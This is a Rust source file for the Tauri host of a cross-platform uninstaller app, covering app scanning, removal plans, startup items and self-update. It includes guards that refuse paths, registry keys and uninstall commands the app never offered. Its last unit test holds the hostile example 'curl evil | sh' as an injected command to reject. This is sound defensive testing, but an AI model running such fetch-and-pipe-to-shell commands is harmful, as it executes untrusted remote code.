//! Tauri host for BHUninstaller.
//!
//! Every command here is a thin wrapper over `bhu-core`. No scanning logic, no
//! safety rules and no matching live in this crate — that all belongs to the
//! engine, so that the Windows and Linux builds get identical behaviour from
//! the same code.

use bhu_core::access::AccessReport;
use bhu_core::cleaner::JunkGroup;
use bhu_core::extensions::ExtensionGroup;
use bhu_core::leftovers::OrphanGroup;
use bhu_core::model::*;
use bhu_core::selfupdate::{CheckResult, Release};
use bhu_core::settings::Settings;
use bhu_core::startup::StartupItem;
use bhu_core::undo::{RestoreOutcome, UndoEntry};
use bhu_core::updates::UpdateInfo;
use bhu_core::{discovery, removal};
use std::collections::{HashMap, HashSet};
use std::path::PathBuf;
use std::sync::Mutex;
use tauri::{Manager, State};

/// Scans are expensive, so the results are kept for the lifetime of the window.
/// The app list in particular is needed by every leftover scan, since knowing
/// what else is installed is what stops one app claiming another's files.
#[derive(Default)]
struct Cache {
    apps: Mutex<Vec<InstalledApp>>,
    orphans: Mutex<Vec<OrphanGroup>>,
    startup: Mutex<Vec<StartupItem>>,
    extensions: Mutex<Vec<ExtensionGroup>>,
    updates: Mutex<Vec<UpdateInfo>>,
    junk: Mutex<Vec<JunkGroup>>,
    /// Everything the backend has offered up in a plan.
    ///
    /// The interface can deselect items but never invent them, so anything
    /// arriving at `execute_plan` that was never offered did not come from a
    /// plan this app produced. The engine's blocklist would still refuse
    /// system and personal paths, but it would happily remove any ordinary
    /// file — so the plan is checked against what was actually offered rather
    /// than taken on trust.
    offered: Mutex<Offered>,
}

/// What the last plan actually contained.
#[derive(Default)]
struct Offered {
    paths: HashSet<PathBuf>,
    /// Registry keys, kept separately because a key is not a file and is not
    /// covered by checking the path: an item can carry a path that was offered
    /// and a key that was not.
    keys: HashSet<String>,
    /// The vendor's own uninstaller.
    ///
    /// This one matters most. It is a command line, and it is run through a
    /// shell — elevated, on Windows. A path arriving that was never offered
    /// costs one wrong file; a command arriving that was never offered is
    /// arbitrary code as administrator. It is checked the same way as the
    /// rest, which until now it was not.
    command: Option<String>,
}

/// Whether an item is one this app actually offered.
///
/// Both halves have to match. Checking the path alone would accept an item
/// carrying a path from the plan and a registry key that was never in it —
/// and the registry branch runs on the key, not the path.
fn was_offered(item: &RemovalItem, paths: &HashSet<PathBuf>, keys: &HashSet<String>) -> bool {
    paths.contains(&item.path)
        && item
            .registry_key
            .as_ref()
            .map(|k| keys.contains(k))
            .unwrap_or(true)
}

impl Cache {
    /// The scanned lists, filling a cache that is empty.
    ///
    /// WARNING: an empty cache means "not scanned yet" — it never means
    /// "nothing is installed". `execute_plan` empties every cache on purpose,
    /// so that entries describing something just removed cannot outlive it.
    /// Readers that took empty as the answer therefore replied "no such item"
    /// to everything after any removal: the Uninstall button silently did
    /// nothing, with the rows still on screen because the interface keeps its
    /// own copy, and only quitting and reopening the app brought it back.
    /// Every reader goes through these, so the rule holds in one place
    /// instead of five.
    fn apps(&self) -> Vec<InstalledApp> {
        let mut apps = self.apps.lock().unwrap();
        if apps.is_empty() {
            *apps = discovery::installed_apps(discovery::ScanOptions::default());
        }
        apps.clone()
    }

    fn orphans(&self) -> Vec<OrphanGroup> {
        let mut groups = self.orphans.lock().unwrap();
        if groups.is_empty() {
            *groups = bhu_core::scan_orphans();
        }
        groups.clone()
    }

    fn extensions(&self) -> Vec<ExtensionGroup> {
        let mut groups = self.extensions.lock().unwrap();
        if groups.is_empty() {
            *groups = bhu_core::extensions::list();
        }
        groups.clone()
    }

    fn junk(&self) -> Vec<JunkGroup> {
        let mut groups = self.junk.lock().unwrap();
        if groups.is_empty() {
            *groups = bhu_core::cleaner::scan();
        }
        groups.clone()
    }

    fn startup(&self) -> Vec<StartupItem> {
        let mut items = self.startup.lock().unwrap();
        if items.is_empty() {
            *items = bhu_core::startup::list();
        }
        items.clone()
    }

    /// Record what a plan put in front of the user.
    fn offer(&self, plan: &RemovalPlan) {
        let mut offered = self.offered.lock().unwrap();
        offered.paths.clear();
        offered.keys.clear();
        offered.command = plan.delegated_command.clone();
        for item in &plan.items {
            offered.paths.insert(item.path.clone());
            if let Some(key) = &item.registry_key {
                offered.keys.insert(key.clone());
            }
        }
    }
}

#[tauri::command]
fn list_apps(refresh: bool, cache: State<Cache>) -> Vec<InstalledApp> {
    let mut apps = cache.apps.lock().unwrap();
    if apps.is_empty() || refresh {
        *apps = discovery::installed_apps(discovery::ScanOptions::default());
    }
    apps.clone()
}

/// Icons for the list, fetched after the first paint so the window appears
/// immediately rather than waiting on one subprocess per app.
#[tauri::command]
fn app_icons(cache: State<Cache>) -> HashMap<String, String> {
    // Scan first if this somehow arrives before the list — an empty result here
    // would leave every row showing a placeholder with no way to recover.
    let apps = {
        let mut guard = cache.apps.lock().unwrap();
        if guard.is_empty() {
            *guard = discovery::installed_apps(discovery::ScanOptions::default());
        }
        guard.clone()
    };
    discovery::icons(&apps)
}

/// The expensive per-app details for the detail pane: developer, notarisation,
/// last opened, whether it is running.
#[tauri::command]
fn app_details(id: String, cache: State<Cache>) -> Option<InstalledApp> {
    let app = cache.apps().iter().find(|a| a.id == id).cloned()?;
    let mut app = app;
    discovery::enrich(&mut app);
    Some(app)
}

/// The dry run: what uninstalling this app would remove.
#[tauri::command]
fn plan_uninstall(id: String, cache: State<Cache>) -> Option<RemovalPlan> {
    let apps = cache.apps();
    let app = apps.iter().find(|a| a.id == id)?.clone();
    let mut app = app;
    discovery::enrich(&mut app);
    // Goes through the engine's own planner rather than assembling a plan here:
    // that is what attaches the platform's uninstall command. Building it
    // by hand meant Windows never ran the vendor's uninstaller and tried to
    // delete Program Files itself instead.
    let plan = bhu_core::plan_uninstall(&app, &apps);
    cache.offer(&plan);
    Some(plan)
}

#[tauri::command]
fn orphan_groups(refresh: bool, cache: State<Cache>) -> Vec<OrphanGroup> {
    let mut groups = cache.orphans.lock().unwrap();
    if groups.is_empty() || refresh {
        *groups = bhu_core::scan_orphans();
    }
    groups.clone()
}

/// A plan for the selected orphan groups.
#[tauri::command]
fn plan_orphans(names: Vec<String>, cache: State<Cache>) -> RemovalPlan {
    let groups = cache.orphans();
    let items: Vec<Leftover> = groups
        .into_iter()
        .filter(|g| names.contains(&g.name))
        .flat_map(|g| g.items)
        .collect();
    let mut plan = removal::build_orphan_plan(items);
    // The user picked these groups deliberately, so start with everything
    // ticked — but they still see the full list before anything moves.
    for item in plan.items.iter_mut() {
        item.selected = true;
    }
    cache.offer(&plan);
    plan
}

/// Carry out a plan. Everything goes to the Trash.
#[tauri::command]
fn execute_plan(plan: RemovalPlan, force: bool, cache: State<Cache>) -> RemovalReport {
    // Nothing is removed, and nothing is run, that this app did not itself put
    // in front of the user.
    let mut plan = plan;
    let (paths, keys, command) = {
        let o = cache.offered.lock().unwrap();
        (o.paths.clone(), o.keys.clone(), o.command.clone())
    };

    // A command line is the most dangerous thing a plan can carry, so it is
    // dropped outright unless it is the one that was offered.
    if plan.delegated_command.is_some() && plan.delegated_command != command {
        plan.delegated_command = None;
    }

    let mut refused: Vec<RemovalOutcome> = Vec::new();
    plan.items.retain(|item| {
        if !item.selected || was_offered(item, &paths, &keys) {
            return true;
        }
        refused.push(RemovalOutcome {
            path: item.path.clone(),
            removed: false,
            already_gone: false,
            trashed_to: None,
            error: Some("this was not part of the plan you were shown — refusing".into()),
        });
        false
    });

    let opts = RemovalOptions {
        sound: bhu_core::settings::load().removal_sound,
        force,
    };
    let mut report = removal::execute(&plan, opts);
    report.outcomes.extend(refused);
    // Whatever just moved is gone from the disk; the caches must not keep
    // claiming otherwise.
    cache.apps.lock().unwrap().clear();
    cache.orphans.lock().unwrap().clear();
    cache.extensions.lock().unwrap().clear();
    cache.startup.lock().unwrap().clear();
    cache.updates.lock().unwrap().clear();
    cache.junk.lock().unwrap().clear();
    report
}

#[tauri::command]
fn startup_items(refresh: bool, cache: State<Cache>) -> Vec<StartupItem> {
    let mut items = cache.startup.lock().unwrap();
    if items.is_empty() || refresh {
        *items = bhu_core::startup::list();
    }
    items.clone()
}

/// Turn a startup item on or off. Always reversible — nothing is deleted.
#[tauri::command]
fn set_startup_enabled(id: String, enabled: bool, cache: State<Cache>) -> Result<(), String> {
    let item = cache
        .startup()
        .iter()
        .find(|i| i.id == id)
        .cloned()
        .ok_or("that startup item is no longer there")?;
    bhu_core::startup::set_enabled(&item, enabled)?;
    // Re-read rather than assuming the change took: launchd is the source of
    // truth for this, not us.
    cache.startup.lock().unwrap().clear();
    Ok(())
}

#[tauri::command]
fn extension_groups(refresh: bool, cache: State<Cache>) -> Vec<ExtensionGroup> {
    let mut groups = cache.extensions.lock().unwrap();
    if groups.is_empty() || refresh {
        *groups = bhu_core::extensions::list();
    }
    groups.clone()
}

/// A plan for the selected extensions. Everything the user ticked arrives
/// pre-selected, but they still see the full list with paths before it runs.
#[tauri::command]
fn plan_extensions(ids: Vec<String>, cache: State<Cache>) -> RemovalPlan {
    let groups = cache.extensions();
    let items: Vec<Leftover> = groups
        .iter()
        .flat_map(|g| g.items.iter())
        .filter(|i| ids.contains(&i.id))
        .map(|i| i.to_leftover())
        .collect();
    let mut plan = removal::build_orphan_plan(items);
    for item in plan.items.iter_mut() {
        item.selected = true;
    }
    // Without this the execute step compares against whatever the *previous*
    // plan offered and refuses every one of these — which is what it has been
    // doing. A guard that silently turns a feature off is still a bug.
    cache.offer(&plan);
    plan
}

#[tauri::command]
fn junk_groups(refresh: bool, cache: State<Cache>) -> Vec<JunkGroup> {
    let mut groups = cache.junk.lock().unwrap();
    if groups.is_empty() || refresh {
        *groups = bhu_core::cleaner::scan();
    }
    groups.clone()
}

/// A plan for the selected junk. Reported-only categories are filtered out
/// here as well as in the UI — the Trash must not become removable because
/// something sent the wrong id.
#[tauri::command]
fn plan_cleanup(ids: Vec<String>, cache: State<Cache>) -> RemovalPlan {
    let groups = cache.junk();
    let items: Vec<Leftover> = groups
        .iter()
        .filter(|g| g.removable)
        .flat_map(|g| g.items.iter())
        .filter(|i| ids.contains(&i.id))
        .map(|i| i.to_leftover())
        .collect();
    let mut plan = removal::build_orphan_plan(items);
    for item in plan.items.iter_mut() {
        item.selected = true;
    }
    cache.offer(&plan);
    plan
}

/// Look up newer versions. The only command in the app that touches the
/// network, and only ever to public endpoints — see `bhu_core::updates`.
#[tauri::command]
fn check_updates(refresh: bool, cache: State<Cache>) -> Vec<UpdateInfo> {
    {
        let cached = cache.updates.lock().unwrap();
        if !cached.is_empty() && !refresh {
            return cached.clone();
        }
    }
    let apps = {
        let mut guard = cache.apps.lock().unwrap();
        if guard.is_empty() {
            *guard = discovery::installed_apps(discovery::ScanOptions::default());
        }
        guard.clone()
    };
    let found = bhu_core::updates::check(&apps);
    *cache.updates.lock().unwrap() = found.clone();
    found
}

#[tauri::command]
fn removal_history() -> Vec<UndoEntry> {
    bhu_core::undo::history()
}

/// Put a past removal back where it came from.
#[tauri::command]
fn restore_removal(id: String, cache: State<Cache>) -> Vec<RestoreOutcome> {
    let outcomes = bhu_core::undo::restore(&id);
    if outcomes.iter().any(|o| o.restored) {
        cache.apps.lock().unwrap().clear();
        cache.orphans.lock().unwrap().clear();
    }
    outcomes
}

#[tauri::command]
fn get_settings() -> Settings {
    bhu_core::settings::load()
}

#[tauri::command]
fn set_settings(settings: Settings) -> Result<(), String> {
    bhu_core::settings::save(&settings)
}

/// Whether the operating system is withholding anything, and what.
#[tauri::command]
fn access_report() -> AccessReport {
    bhu_core::access::report()
}

#[tauri::command]
fn full_disk_access() -> bool {
    bhu_core::access::report().granted
}

/// Open the system settings pane where Full Disk Access is granted.
///
/// Not done through the opener plugin: its default permission covers `http`,
/// `https`, `mailto` and `tel` only, so a `x-apple.systempreferences:` URL is
/// refused — silently, from the interface's point of view, which is exactly how
/// this button came to do nothing at all. Widening that scope would allow the
/// frontend to open any scheme; this command takes no arguments and can only
/// ever open the one pane.
#[tauri::command]
fn open_privacy_settings() -> Result<(), String> {
    #[cfg(target_os = "macos")]
    {
        let mut last = String::from("no settings pane could be opened");
        for url in bhu_core::access::SETTINGS_URLS {
            match bhu_core::proc::command("/usr/bin/open").arg(url).status() {
                Ok(status) if status.success() => return Ok(()),
                Ok(status) => last = format!("open exited with {status}"),
                Err(e) => last = e.to_string(),
            }
        }
        Err(last)
    }
    #[cfg(not(target_os = "macos"))]
    Err("this setting only exists on macOS".into())
}

/// Relaunch, so a newly granted permission takes effect.
///
/// macOS decides Full Disk Access per process: a grant made while the app is
/// running does not reach the running process, which is why the system itself
/// offers "Quit & Reopen". Doing it from here saves the user working that out.
#[tauri::command]
fn relaunch(app: tauri::AppHandle) {
    app.restart();
}

/// Whether this platform can restore from the trash without the user going to
/// the file manager. The UI must not offer a button that does nothing.
#[tauri::command]
fn can_restore() -> bool {
    bhu_core::trash_bin::can_restore_programmatically()
}

/// Look for a newer BHUninstaller.
///
/// `force` is a manual check and always runs. Without it the check only
/// happens when enabled and when a day has passed.
#[tauri::command]
fn check_app_update(force: bool) -> CheckResult {
    let mut settings = bhu_core::settings::load();
    if !force
        && (!settings.auto_check_updates
            || !bhu_core::selfupdate::check_due(settings.last_update_check))
    {
        return CheckResult {
            update: None,
            current: bhu_core::VERSION.to_string(),
            error: None,
        };
    }

    let result = bhu_core::selfupdate::check();
    // Only a check that actually completed resets the clock, so a spell offline
    // does not postpone the next attempt by a day.
    if result.error.is_none() {
        settings.last_update_check = std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .map(|d| d.as_secs() as i64)
            .unwrap_or(0);
        let _ = bhu_core::settings::save(&settings);
    }
    result
}

/// Download the update and return where it was saved. Nothing is run.
#[tauri::command]
fn download_app_update(release: Release) -> Result<String, String> {
    bhu_core::selfupdate::download(&release).map(|p| p.to_string_lossy().to_string())
}

/// Start the downloaded installer and close BHUninstaller.
///
/// The app has to be gone before an installer can replace it — on Windows the
/// installer simply refuses while it is running — so this launches it and then
/// exits rather than leaving the user to work that out.
///
/// The path is not taken on trust even though it came from `download_app_update`
/// a moment earlier: it must still be inside the download directory this
/// process created, and carry an installer extension. Running an arbitrary
/// path handed over from the interface is not something to leave open.
#[tauri::command]
fn install_update(app: tauri::AppHandle, path: String) -> Result<(), String> {
    let path = PathBuf::from(&path);
    // Exactly the file this process downloaded, not merely something in the
    // directory it downloaded into.
    if bhu_core::selfupdate::last_download().as_deref() != Some(path.as_path()) {
        return Err("that file was not downloaded by this app — refusing to run it".into());
    }
    let ext = path
        .extension()
        .and_then(|e| e.to_str())
        .map(|e| e.to_lowercase())
        .unwrap_or_default();
    if !matches!(ext.as_str(), "dmg" | "pkg" | "msi" | "exe" | "deb" | "rpm") {
        return Err(format!("{ext} is not an installer — refusing to run it"));
    }
    if !path.is_file() {
        return Err("the download is no longer there".into());
    }

    let mut command = installer_command(&path, &ext);
    command
        .spawn()
        .map_err(|e| format!("could not start the installer: {e}"))?;

    // Give it a moment to appear before this window disappears, so the user
    // does not watch the app vanish with nothing yet on screen.
    let handle = app.clone();
    std::thread::spawn(move || {
        std::thread::sleep(std::time::Duration::from_millis(1500));
        handle.exit(0);
    });
    Ok(())
}

fn installer_command(path: &std::path::Path, ext: &str) -> std::process::Command {
    #[cfg(target_os = "windows")]
    {
        // An .msi is data, not a program: it needs msiexec to run it.
        if ext == "msi" {
            let mut c = bhu_core::proc::command("msiexec");
            c.arg("/i").arg(path);
            return c;
        }
        return bhu_core::proc::command(path);
    }
    #[cfg(target_os = "macos")]
    {
        let _ = ext;
        let mut c = bhu_core::proc::command("/usr/bin/open");
        c.arg(path);
        c
    }
    #[cfg(target_os = "linux")]
    {
        let _ = ext;
        let mut c = bhu_core::proc::command("xdg-open");
        c.arg(path);
        c
    }
}

#[tauri::command]
fn engine_version() -> String {
    bhu_core::VERSION.to_string()
}

/// Keep the window inside the part of the screen that is actually usable.
///
/// A window is positioned against the whole monitor, but the taskbar, dock or
/// panel takes a slice of it. Centring a 700-point window on a 768-point screen
/// leaves its bottom edge behind the Windows taskbar — which is where the
/// sidebar's last items were disappearing to.
///
/// So the size is clamped to the work area rather than the monitor, decorations
/// included, and the window is centred within that area instead.
fn fit_to_work_area(window: &tauri::WebviewWindow) {
    // ⚠️ `current_monitor` answers by asking which monitor the window is on —
    // and this runs before the window has been shown, so on Wayland there is
    // no answer yet and it returns `None`. Returning early there meant the
    // whole fit silently did nothing on Linux, which is why an earlier attempt
    // to cap the size changed nothing at all. Fall back to the primary
    // monitor, then to whatever monitor exists.
    let monitor = window
        .current_monitor()
        .ok()
        .flatten()
        .or_else(|| window.primary_monitor().ok().flatten())
        .or_else(|| {
            window
                .available_monitors()
                .ok()
                .and_then(|m| m.into_iter().next())
        });
    let Some(monitor) = monitor else {
        return;
    };
    let scale = monitor.scale_factor();
    let area = monitor.work_area();
    let (area_w, area_h) = (
        area.size.width as f64 / scale,
        area.size.height as f64 / scale,
    );
    let (area_x, area_y) = (
        area.position.x as f64 / scale,
        area.position.y as f64 / scale,
    );

    let (Ok(outer), Ok(inner)) = (window.outer_size(), window.inner_size()) else {
        return;
    };
    // The title bar and borders count against the space available.
    let deco_w = outer.width.saturating_sub(inner.width) as f64 / scale;
    let deco_h = outer.height.saturating_sub(inner.height) as f64 / scale;

    // A margin so the window never sits flush against an edge, and a ceiling
    // as a share of the screen.
    //
    // The configured default is chosen for a laptop display. On a smaller
    // desktop — or one reporting a fractional scale, which a Linux VM on a Mac
    // does — that same figure covers nearly the whole screen, and the app opens
    // looking as though it wanted to be full screen. It should open as a
    // window; making it larger is the user's decision, and the maximise button
    // is right there.
    //
    // Height gets the more generous share because the list is what people
    // scroll, and a short window is more annoying than a narrow one.
    const MARGIN: f64 = 24.0;
    const MAX_WIDTH_SHARE: f64 = 0.72;
    const MAX_HEIGHT_SHARE: f64 = 0.80;
    let want_w = inner.width as f64 / scale;
    let want_h = inner.height as f64 / scale;
    let room_w = (area_w - MARGIN - deco_w).min(area_w * MAX_WIDTH_SHARE);
    let room_h = (area_h - MARGIN - deco_h).min(area_h * MAX_HEIGHT_SHARE);
    let w = want_w.min(room_w.max(320.0));
    let h = want_h.min(room_h.max(320.0));

    if w < want_w || h < want_h {
        let _ = window.set_size(tauri::LogicalSize::new(w, h));
    }
    let _ = window.set_position(tauri::LogicalPosition::new(
        area_x + (area_w - (w + deco_w)) / 2.0,
        area_y + (area_h - (h + deco_h)) / 2.0,
    ));
}

pub fn run() {
    tauri::Builder::default()
        .setup(|app| {
            // The window starts hidden so this happens before it is ever seen —
            // resizing it in front of the user would look like a glitch.
            if let Some(window) = app.get_webview_window("main") {
                fit_to_work_area(&window);
                let _ = window.show();
                let _ = window.set_focus();
            }
            Ok(())
        })
        .plugin(tauri_plugin_opener::init())
        .manage(Cache::default())
        .invoke_handler(tauri::generate_handler![
            list_apps,
            app_icons,
            app_details,
            plan_uninstall,
            orphan_groups,
            plan_orphans,
            execute_plan,
            startup_items,
            set_startup_enabled,
            extension_groups,
            check_updates,
            junk_groups,
            plan_cleanup,
            plan_extensions,
            removal_history,
            restore_removal,
            get_settings,
            set_settings,
            full_disk_access,
            access_report,
            open_privacy_settings,
            relaunch,
            can_restore,
            engine_version,
            check_app_update,
            download_app_update,
            install_update,
        ])
        .run(tauri::generate_context!())
        .expect("error while running BHUninstaller");
}

#[cfg(test)]
mod tests {
    use super::*;
    use bhu_core::model::{Confidence, LeftoverKind};

    fn item(path: &str, key: Option<&str>) -> RemovalItem {
        RemovalItem {
            path: PathBuf::from(path),
            name: "x".into(),
            size_bytes: 0,
            size_unknown: false,
            is_directory: false,
            kind: LeftoverKind::Other,
            confidence: Confidence::High,
            reason: String::new(),
            requires_admin: false,
            selected: true,
            registry_key: key.map(str::to_string),
        }
    }

    fn offered_for(plan: &RemovalPlan) -> Offered {
        let cache = Cache::default();
        cache.offer(plan);
        let o = cache.offered.lock().unwrap();
        Offered {
            paths: o.paths.clone(),
            keys: o.keys.clone(),
            command: o.command.clone(),
        }
    }

    #[test]
    fn an_item_that_was_never_offered_is_refused() {
        let plan = RemovalPlan {
            app: None,
            items: vec![item("/tmp/a", None)],
            delegated_command: None,
        };
        let o = offered_for(&plan);
        assert!(was_offered(&item("/tmp/a", None), &o.paths, &o.keys));
        assert!(!was_offered(&item("/tmp/b", None), &o.paths, &o.keys));
    }

    #[test]
    fn a_registry_key_cannot_ride_in_on_an_offered_path() {
        // The path was offered; the key attached to it was not.
        let plan = RemovalPlan {
            app: None,
            items: vec![item(
                "HKCU\\Software\\Vendor",
                Some("HKCU\\Software\\Vendor"),
            )],
            delegated_command: None,
        };
        let o = offered_for(&plan);
        assert!(was_offered(
            &item("HKCU\\Software\\Vendor", Some("HKCU\\Software\\Vendor")),
            &o.paths,
            &o.keys
        ));
        assert!(!was_offered(
            &item(
                "HKCU\\Software\\Vendor",
                Some("HKCU\\Software\\SomeoneElse")
            ),
            &o.paths,
            &o.keys
        ));
    }

    #[test]
    fn only_the_offered_uninstall_command_survives() {
        let plan = RemovalPlan {
            app: None,
            items: vec![],
            delegated_command: Some("\"C:\\Foo\\unins000.exe\" /S".into()),
        };
        let o = offered_for(&plan);
        assert_eq!(o.command.as_deref(), Some("\"C:\\Foo\\unins000.exe\" /S"));
        // Anything else the interface might send is not this, so it is dropped.
        assert_ne!(o.command.as_deref(), Some("curl evil | sh"));
    }
}
